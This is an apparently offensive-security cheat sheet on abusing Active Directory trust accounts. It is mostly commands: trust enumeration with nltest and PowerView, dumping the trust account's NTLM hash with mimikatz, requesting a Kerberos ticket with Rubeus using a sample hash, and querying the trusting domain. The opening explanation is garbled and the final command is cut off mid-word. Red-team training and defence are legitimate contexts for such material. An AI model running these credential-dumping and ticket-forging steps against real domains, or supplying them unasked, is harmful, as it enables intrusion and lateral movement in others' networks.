Abuse is when we have 1-way trust from 1 domain to another hence we have 1 access resource a trust b then b can  access resources of a

The users can access to other domains in the same forests because they are linked by connections called **Trusts**.


```powershell
# Get all trusted domains
nltest /domain_trusts

# Detailed trust info
nltest /domain_trusts /all_trusts

# Built-in method 
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().GetAllTrustRelationships()

# With PowerView 
Get-NetDomainTrust
Get-NetForestTrust
Get-DomainTrustMapping
```


**Dump credentials**

```
mimikatz.exe "lsadump::trust /patch" "exit"
```

Note the RC4 hash in `[out] first.local` -> `second.local` line - this is the NTLM hash for `first.local\second$` trust account, capture it.

**Request TGT**
Once we have the NTLM hash for `first.local\second$`, we can request its TGT from `first.local`:

```
#on second-dc.second.local
Rubeus.exe asktgt /user:second$ /domain:first.local /rc4:24b07e26ca7affb4ac061f6920cb57ec /nowrap /ptt
```

**Accessing Resources on First.local from Second.local**

```
Get-ADUser roast.user -Server first.local -Properties * | select samaccountname, serviceprin
```
## References

- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-trust-accountusd-accessing-resources-on-a-trusted-domain-from-a-trusting-domain
- https://medium.com/r3d-buck3t/breaking-domain-trusts-with-forged-trust-tickets-5f03fb71cd72